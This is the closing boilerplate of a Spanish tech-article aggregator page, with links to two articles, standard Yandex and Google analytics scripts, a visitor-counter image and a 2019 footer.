<li><a href="../es432086/index.html">Impresi√≥n 3D en la escuela internacional que lleva el nombre de M.V. Lomonosov</a></li>
<li><a href="../es432088/index.html">Alta disponibilidad de MySQL en GitHub</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>